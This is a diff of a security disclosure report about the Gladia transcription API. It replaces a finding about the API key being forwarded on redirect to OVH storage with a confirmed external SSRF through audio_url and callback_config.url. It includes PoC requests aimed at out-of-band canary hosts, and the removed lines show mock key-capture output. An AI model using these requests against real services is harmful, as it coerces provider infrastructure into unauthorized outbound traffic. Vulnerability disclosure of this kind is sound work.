@@ -1,199 +1,213 @@
-# Gladia API key (`x-gladia-key`) disclosed to third-party storage host (OVH S3) on file-download redirect
+# Server-Side Request Forgery (SSRF) — `audio_url` and `callback_config.url`
 
 ## Summary
 
-Both official Gladia SDKs (`@gladiaio/sdk` and `gladiaio-sdk`, v2.0.0) transmit the customer's
-Gladia API key to an unrelated third-party host when downloading a job's audio file.
+The Gladia pre-recorded transcription API performs server-side HTTP requests to URLs supplied by an
+authenticated client, and those requests reach arbitrary attacker-controlled external hosts. Two request
+parameters were independently confirmed to trigger an outbound request from Gladia's backend
+infrastructure to a tester-controlled out-of-band (OOB) canary:
 
-`GET /v2/pre-recorded/{id}/file` (and `/v2/live/{id}/file`) responds with an HTTP 302 redirect to a
-presigned object-storage URL on `s3.gra.perf.cloud.ovh.net` (OVH). The SDKs automatically follow that
-cross-origin redirect and re-send the `x-gladia-key` request header to the OVH host. The presigned URL
-is self-authenticating and does **not** require the key, so the key is transmitted to OVH (and its access
-logs) with no functional purpose. This is unnecessary exposure of a long-lived secret credential to a
-host outside the intended trust boundary (`api.gladia.io`).
+- `audio_url` — the backend issues a server-side **GET** to the supplied URL.
+- `callback_config.url` — on job completion the backend issues a server-side **POST** (containing the
+  job result JSON) to the supplied URL.
+
+Both interactions were observed on two independent tester-controlled OOB services (webhook.site and Burp
+Collaborator), originating from OVH-hosted IP addresses consistent with Gladia's EU infrastructure.
+
+Scope note on impact: direct requests to loopback, link-local (`169.254.169.254`), and RFC1918 targets
+were rejected quickly in earlier testing (pre-connection filtering), so internal/metadata access was
+**not** achieved and is **not** claimed here. This report documents confirmed SSRF to arbitrary external
+destinations.
 
 ## Severity
 
-Low (Medium if OVH-side access logs are retained/accessible, or if the API key is broadly privileged).
+Medium.
 
-Estimated CVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N` ≈ 3.7 (Low). Severity note: the receiving host
-is Gladia's storage subprocessor over TLS, not an arbitrary attacker, so this is a credential-hygiene /
-information-exposure issue rather than direct key theft. Final rating is the program's to set.
+Estimated CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` ≈ 5.4. Rationale: any authenticated Gladia
+customer can coerce the backend into sending GET/POST requests to arbitrary external hosts; internal
+resource access was not demonstrated (obvious internal ranges appear filtered). Final rating is the
+program's to set.
 
 ## Affected Asset
 
-- URL: `https://api.gladia.io/v2/pre-recorded/{id}/file` and `https://api.gladia.io/v2/live/{id}/file`
-- Endpoint: pre-recorded / live job audio download (`get_file()` / `getFile()`)
-- Parameter: `x-gladia-key` request header (auto-forwarded on redirect)
-- HTTP Method: GET
-- Affected functionality: SDK file-download helpers
-  - Python `gladiaio_sdk`: `PreRecordedV2Client.get_file` / async, `LiveV2Client.get_file`
-    (`network/http_client.py` — `httpx.Client(..., follow_redirects=True)` at the sync client, and
-    the equivalent `httpx.AsyncClient(..., follow_redirects=True)`).
-  - JS `@gladiaio/sdk`: `PreRecordedV2Client.getFile` / `LiveV2Client.getFile`
-    (`network/httpClient.ts` — `fetch()` with default `redirect: 'follow'`).
+- URL: `https://api.gladia.io/v2/pre-recorded`
+- Endpoint: `POST /v2/pre-recorded` (job creation)
+- Parameters (two attack surfaces of the same SSRF class):
+  - `audio_url` (string) → server-side GET
+  - `callback_config.url` (string, with `callback: true`) → server-side POST on completion
+- HTTP Method: POST (to create the job); the SSRF request itself is GET (audio_url) / POST (callback)
+- Functionality: URL-based audio ingestion, and job-completion webhook callback
 
-## Vulnerability Details
+## Vulnerability Description
 
-The API key is sent as a **custom** header, `x-gladia-key`. On a cross-origin HTTP redirect, both
-underlying HTTP clients strip only *standard* credential headers (`Authorization`, `Cookie`,
-`Proxy-Authorization`) and preserve custom headers. Because neither SDK disables redirect-following nor
-removes `x-gladia-key` when the redirect target host differs from the configured API host, the key is
-forwarded verbatim to whatever host the `Location` header names.
-
-In production, `Location` points to `s3.gra.perf.cloud.ovh.net` — a different registrable domain than
-`api.gladia.io`. The presigned URL carries its own AWS SigV4 authentication in the query string
-(`X-Amz-Signature`, `X-Amz-Expires=86400`) and is validated by object storage independently of the
-Gladia key. Sending `x-gladia-key` to that host therefore provides no function and only exposes the
-secret to a third party and its logging pipeline.
+Gladia supports transcribing audio from a URL and notifying a caller-supplied callback URL when a job
+finishes. In both cases the backend performs the outbound HTTP request itself. Testing confirmed the
+backend will connect to arbitrary attacker-chosen **external** hosts with no allowlist restricting the
+destination, no authentication of the requester's ownership of the target, and (for callbacks) no request
+signature. This is Server-Side Request Forgery: the request originates from Gladia's trusted network
+position rather than the attacker's, and the destination is fully attacker-controlled.
 
 Observed facts vs. assumptions:
-- Observed: the `/file` endpoint returns 302 to `s3.gra.perf.cloud.ovh.net`.
-- Observed: the presigned URL returns the audio with no key, and with a junk key (both HTTP 200) — the
-  key is superfluous at the storage host.
-- Observed (local, controlled): both SDKs re-send `x-gladia-key` on a cross-origin redirect.
-- Assumption (not independently verified against OVH's servers): OVH logs inbound request headers. This
-  is standard for HTTP access logging but was not confirmed on Gladia/OVH infrastructure.
+- Observed: server-side GET to the tester `audio_url` canary (two OOB services, multiple OVH source IPs).
+- Observed: server-side POST to the tester `callback_config.url` canary carrying the job result JSON,
+  `Content-Type: application/json`, `User-Agent: axios/1.18.1`, and **no signature/authentication header**.
+- Observed (earlier, timing/encoding/DNS tests): loopback/link-local/RFC1918 and metadata hostnames are
+  rejected quickly (pre-connection filtering) — internal access not achieved.
+- Not established from available evidence: whether the fetcher follows HTTP redirects to a new host
+  without re-validating the destination (a common filter-bypass path to internal resources). Not tested,
+  per assessment scope (no redirect toward internal/metadata).
 
 ## Preconditions
 
-- A valid Gladia API key.
-- Any completed job with a retrievable audio file (normal usage).
-- The consumer application calls the SDK's file-download helper (`get_file()` / `getFile()`), which is
-  the documented way to retrieve job audio.
+- A valid Gladia API key (any authenticated customer account).
 
 ## Steps to Reproduce
 
-1. Create/own a Gladia account and obtain an API key.
-2. Submit any audio for transcription so a job with a downloadable file exists; note its job `id`.
-3. Request the file endpoint and inspect the redirect without following it (see PoC request 1) — observe
-   the 302 `Location` points to `s3.gra.perf.cloud.ovh.net`.
-4. Fetch the presigned `Location` URL with no `x-gladia-key` header (PoC request 2) — observe HTTP 200
-   and the audio bytes, proving the key is not needed at the storage host.
-5. Confirm the SDK forwards the key: call `get_file()` / `getFile()` through an intercepting proxy (or
-   the local mock in PoC request 3) and observe `x-gladia-key` present in the outbound request to the
-   redirect target host.
+### Surface 1 — `audio_url`
+1. Authenticate with a valid Gladia API key.
+2. Send `POST /v2/pre-recorded` with `{"audio_url": "https://<TESTER-OOB>/audio-url-test"}`.
+3. Observe a server-side **GET** to `<TESTER-OOB>/audio-url-test` in the OOB service.
+
+### Surface 2 — `callback_config.url`
+1. Authenticate with a valid Gladia API key.
+2. Upload a small valid audio file via `POST /v2/upload` to obtain a working `audio_url`.
+3. Send `POST /v2/pre-recorded` with:
+   `{"audio_url": "<uploaded>", "callback": true, "callback_config": {"url": "https://<TESTER-OOB>/callback-test", "method": "POST"}}`.
+4. Wait for the job to reach `done`.
+5. Observe a server-side **POST** to `<TESTER-OOB>/callback-test` in the OOB service, carrying the result JSON.
 
 ## Proof of Concept
 
-Keys and the AWS signature are redacted. Job/file identifiers below belong to the tester's own accounts.
+API key redacted. OOB URLs are tester-controlled. Job/file IDs belong to the tester's own account.
 
-PoC request 1 — capture the redirect (do not follow):
+Surface 1 request:
 
 ```http
-GET /v2/pre-recorded/06fddbe9-df88-4339-b474-aeaffdd11967/file HTTP/2
+POST /v2/pre-recorded HTTP/2
 Host: api.gladia.io
 x-gladia-key: sk_gladia_REDACTED
+Content-Type: application/json
+
+{"audio_url":"https://webhook.site/<TESTER-UUID>/audio-url-test"}
 ```
 
-Response 1 (redirect leaves api.gladia.io):
+Surface 2 request:
 
 ```http
-HTTP/2 302
-location: https://s3.gra.perf.cloud.ovh.net/gladia-eu-api-files/files/ced4a668-6e2c-4d17-9e4a-4e95f4242a15.wav?x-id=GetObject&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=REDACTED%2F20260916%2Fgra%2Fs3%2Faws4_request&X-Amz-Date=20260916T150339Z&X-Amz-Expires=86400&X-Amz-SignedHeaders=host&X-Amz-Signature=REDACTED
+POST /v2/pre-recorded HTTP/2
+Host: api.gladia.io
+x-gladia-key: sk_gladia_REDACTED
+Content-Type: application/json
+
+{"audio_url":"https://api.gladia.io/file/c91843be-f22b-4229-bde9-a6b716fdaa46",
+ "callback":true,
+ "callback_config":{"url":"https://webhook.site/<TESTER-UUID>/callback-test","method":"POST"}}
 ```
 
-PoC request 2 — the presigned URL needs no Gladia key (key is superfluous at OVH):
+Surface 2 response:
 
 ```http
-GET /gladia-eu-api-files/files/ced4a668-...wav?...X-Amz-Signature=REDACTED HTTP/2
-Host: s3.gra.perf.cloud.ovh.net
+HTTP/2 201
+{"id":"d77b9fd7-089b-4490-b558-d62005e8af57","result_url":"https://api.gladia.io/v2/pre-recorded/d77b9fd7-089b-4490-b558-d62005e8af57"}
 ```
 
-Response 2:
+## OOB Evidence
 
-```http
-HTTP/2 200
-content-type: application/octet-stream
-content-length: 32044
+Surface 1 — `audio_url` (GET):
+- Interaction received: **Yes** (two independent OOB services)
+- HTTP method: GET
+- webhook.site: `2026-09-16 16:44:01 UTC`, path `/audio-url-test`, source IP `51.91.142.116` (OVH, FR), User-Agent: none
+- Burp Collaborator: `2026-09-16 16:43:58–16:44:00 UTC`, HTTP GET `/audio-url-test`, source IPs `51.178.58.138` and `91.134.55.10` (OVH, FR), preceded by DNS A-record lookups of the canary hostname
+- Relevant headers (Collaborator, decoded): `GET /audio-url-test HTTP/1.1` / `accept: */*` / `host: <canary>.oastify.com`
+- Source information: OVH-hosted IPs (France), consistent with Gladia's EU infrastructure and the same
+  provider/region as the confirmed storage host `s3.gra.perf.cloud.ovh.net`
 
-RIFF....WAVE   (audio bytes returned; no x-gladia-key was sent)
-```
-
-The same request repeated with `x-gladia-key: JUNK` also returns HTTP 200 — the storage host ignores the
-header entirely, confirming it serves no purpose there.
-
-PoC request 3 — SDK re-sends the key across origins (local, controlled proof of the forwarding behavior).
-A mock API on `127.0.0.1:8001` answers 302 to a logging host on `127.0.0.2:8002`; driving the real SDKs
-(`gladiaio_sdk` sync + async, `@gladiaio/sdk`) at the mock produced, at the different-origin logging host:
-
-```text
-ATTACKER HOST RECEIVED: GET /steal/... | x-gladia-key = FAKE-TEST-KEY-1234  | authorization = None   (py sync)
-ATTACKER HOST RECEIVED: GET /steal/... | x-gladia-key = FAKE-TEST-KEY-ASYNC | authorization = None   (py async)
-ATTACKER HOST RECEIVED: GET /steal/... | x-gladia-key = FAKE-TEST-KEY-JS    | authorization = None   (js)
-```
-
-`authorization` (a standard header, set for comparison) was correctly stripped, isolating the root cause:
-only the custom `x-gladia-key` survives the cross-origin redirect. Scripts: `poc/mock.py`, `poc/poc.py`,
-`poc/poc.mjs` in this workspace.
+Surface 2 — `callback_config.url` (POST):
+- Interaction received: **Yes** (webhook.site)
+- HTTP method: POST
+- Timestamp: `2026-09-16 16:45:22 UTC`, path `/callback-test`
+- Source IP: `5.196.147.101` (OVH, FR)
+- User-Agent: `axios/1.18.1`
+- Content-Type: `application/json`; Content-Length: 275
+- Authentication/signature headers present: **No** (no `x-gladia-signature`, HMAC, or bearer token)
+- Body (tester's own job result):
+  `{"id":"d77b9fd7-...","event":"transcription.success","payload":{"metadata":{...},"transcription":{"full_transcript":""}}}`
 
 ## Expected Behavior
 
-The API key should be sent only to the configured Gladia API host. On a redirect to a different origin,
-the SDK should drop `x-gladia-key` (as HTTP clients already do for `Authorization`).
+Server-side fetches (audio ingestion and callbacks) should be constrained to prevent the backend from
+being used as a request proxy: destinations validated against policy, internal ranges blocked at every
+hop including redirects, and callbacks authenticated with a verifiable signature.
 
 ## Actual Behavior
 
-The SDK follows the cross-origin 302 and re-sends `x-gladia-key` to `s3.gra.perf.cloud.ovh.net`, where it
-is unnecessary, on every file download.
+The backend issues server-side GET (`audio_url`) and POST (`callback_config.url`) requests to arbitrary
+attacker-controlled external hosts, and the callback carries application-generated result data with no
+signature.
 
 ## Security Impact
 
-The customer's long-lived Gladia API key is disclosed to a third-party host (OVH object storage) and its
-request-logging pipeline, outside the intended `api.gladia.io` trust boundary, on every audio download.
-Anyone with access to OVH-side access logs (OVH personnel, a log-processing subprocessor, or an attacker
-who compromises that logging path) could recover live Gladia API keys. Because Gladia keys are bearer
-credentials, a recovered key grants full API access to that tenant's data and quota.
+Demonstrated: an authenticated attacker can coerce Gladia's backend into sending arbitrary GET requests
+(via `audio_url`) and POST requests carrying job data (via `callback_config.url`) to any external host of
+their choosing, from Gladia's trusted network egress. This enables using Gladia as an outbound request
+proxy (e.g., to interact with third-party endpoints while masking the true origin behind Gladia's IPs),
+and the unsigned callback means a receiver cannot cryptographically attribute the callback to Gladia.
+
+Not demonstrated (and not claimed): access to cloud metadata, loopback, or internal RFC1918 services —
+direct attempts to those targets were filtered. Escalation to internal access would require the fetcher
+to follow redirects to internal hosts without re-validation, which was not tested under this assessment's
+rules.
 
 ## Attack Scenario
 
-An application backend uses `get_file()` to fetch transcription audio. On each call its Gladia API key is
-transmitted to OVH's S3 endpoint. An adversary with visibility into OVH's HTTP access logs for that bucket
-endpoint (or a misconfiguration/leak of those logs) harvests the recurring `x-gladia-key` header value and
-reuses it directly against `api.gladia.io` to read the victim tenant's jobs, audio, and transcripts.
+An authenticated customer submits `audio_url`/`callback_config.url` values pointing at an external system
+they wish to reach indirectly. Gladia's backend performs the request from its OVH egress IPs, so the
+target sees the traffic as originating from Gladia rather than the attacker. Because callbacks are
+unsigned, an attacker who can influence a victim integration's callback endpoint configuration could also
+deliver forged-looking `transcription.success` payloads that the victim cannot distinguish from genuine
+Gladia callbacks.
 
 ## Root Cause
 
-The SDKs authenticate with a custom header (`x-gladia-key`) but rely on the HTTP client's default
-redirect-following. `httpx` (`follow_redirects=True`) and `undici`/WHATWG `fetch` (`redirect: 'follow'`)
-strip only standard credential headers on cross-origin redirects, not custom ones. No SDK-level logic
-removes `x-gladia-key` when the redirect host changes. Behavior was introduced with the file-download
-redirect handling (repo commit `bd3a394`, "Add follow_redirect to handle get_file redirection to s3").
+Server-side URL retrieval without a destination allowlist. Internal-range filtering exists for directly
+supplied hosts, but arbitrary external destinations are permitted, and callback requests are dispatched
+without a signing mechanism. If redirect destinations are not re-validated, the existing internal filter
+could be bypassed (unverified).
 
 ## Remediation
 
-- Do not auto-follow redirects with credentials attached. Set `follow_redirects=False` (httpx) /
-  `redirect: 'manual'` (fetch) in the file-download path and re-issue the request to the redirect target
-  **without** `x-gladia-key` (and only after validating the scheme/host).
-- Alternatively, register a redirect hook that removes `x-gladia-key` whenever the next hop's origin
-  differs from the configured API origin.
-- Server-side defense-in-depth: the API need not depend on clients forwarding the key through the
-  redirect; the presigned URL already authorizes the download.
-
-## References
-
-- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
-- CWE-522: Insufficiently Protected Credentials
-- OWASP API Security Top 10 (2023) — API2: Broken Authentication (credential handling)
-- PortSwigger / general HTTP-client research on `Authorization`-header stripping across redirects
+- Restrict outbound requests to an explicit allowlist of trusted destinations where feasible.
+- Validate URLs after canonicalization; reject non-audio schemes early.
+- Re-validate every redirect destination against the same policy (block private/loopback/link-local/reserved).
+- Resolve DNS safely and pin the resolved address for the connection to prevent DNS-rebinding bypasses.
+- Apply network-level egress controls around the fetcher/callback workers.
+- Sign callbacks (e.g., HMAC over the body with a per-account secret and a timestamp) so receivers can
+  verify authenticity, and avoid sending unnecessary data to attacker-controlled callback URLs.
 
 ## Evidence
 
-- Live: 302 `Location` to `s3.gra.perf.cloud.ovh.net` (Response 1 above), request IDs from testing on
-  2026-09-16 (e.g. `G-…` values in session logs).
-- Live: presigned URL returns HTTP 200 (32044 bytes, `WAVE audio`) with no key and with a junk key.
-- Local controlled PoC output (Response 3 above); scripts `poc/mock.py`, `poc/poc.py`, `poc/poc.mjs`.
-- Source: `packages/sdk-python/src/gladiaio_sdk/network/http_client.py` (`follow_redirects=True`);
-  `packages/sdk-js/src/network/httpClient.ts` (default `redirect: 'follow'`); repo commit `bd3a394`.
+- webhook.site inbox JSON: GET `/audio-url-test` from `51.91.142.116`; POST `/callback-test` from
+  `5.196.147.101` with result body and no signature header (captured 2026-09-16).
+- Burp Collaborator export (`output/ping`): DNS + HTTP GET `/audio-url-test` interactions from
+  `51.178.58.138`, `91.134.55.10` (2026-09-16 16:43–16:44 UTC).
+- Job created for callback test: `d77b9fd7-089b-4490-b558-d62005e8af57` (tester account).
+- Test scripts: `scratchpad/ssrf_oob.py`, `scratchpad/cb.py`.
 
 ## Verification Status
 
 **Confirmed — Genuine Security Vulnerability**
 
+## Testing Scope
+
+Testing was performed using only the authorized tester account and tester-controlled OOB infrastructure
+(webhook.site and Burp Collaborator). No third-party sensitive data was intentionally accessed or
+transmitted; the only data sent to the callback canary was the tester's own job result. No internal,
+metadata, or RFC1918 targets were accessed.
+
 ## Notes
 
-- Recipient is Gladia's storage subprocessor (OVH) over TLS; this is credential exposure to an unintended
-  party, not direct interception by an arbitrary attacker. Severity is deliberately conservative.
-- Not established from available evidence: OVH's actual header-logging/retention for this endpoint.
-- The presigned URLs are valid for 24h (`X-Amz-Expires=86400`); anyone who obtains a presigned URL can
-  fetch the audio without a key during that window. Tracked separately, not part of this finding
+- The missing callback signature is a related but distinct weakness (webhook authenticity); it is
+  documented here as part of the callback attack surface and may warrant a separate report.
+- Internal-range access appears filtered; the highest-impact escalation (redirect/DNS-rebinding to
+  internal/metadata) remains unproven and would need explicit authorization to test safely.
+- Multiple distinct OVH source IPs were observed, suggesting a pool of fetcher/callback workers.
